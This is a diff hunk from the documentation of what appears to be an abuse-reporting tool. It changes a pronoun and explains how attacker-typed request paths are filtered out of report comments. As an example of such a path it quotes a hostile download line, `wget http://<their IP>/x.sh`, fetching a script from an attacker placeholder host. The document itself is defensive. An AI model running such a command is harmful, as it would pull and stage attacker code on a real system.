@@ -76,7 +76,7 @@ CIDR ranges (the bulk CSV takes single addresses).
 - **HTTP 200 in a report.** A "200" on paths like `/.env` is usually a single-page-app fallback that returns HTML,
   not a leak. The report states the status truthfully.
 - **Sample requests come from the attacker.** The HTTP paths in the comment are typed by the attacker, who may put our
-  domain name in them (scanners paste the target host name into the path) or his own address (`wget http://<his IP>/x.sh`).
+  domain name in them (scanners paste the target host name into the path) or their own address (`wget http://<their IP>/x.sh`).
   A sample that contains an own-name marker, the reported IP or one of the server's own public addresses is left out
   of the comment; the report and its other samples stay. Before 3.6.4 one such path made the validator reject the
   whole file (no reports that day, an alert, a catch-up on the next run). The validator itself is unchanged and still
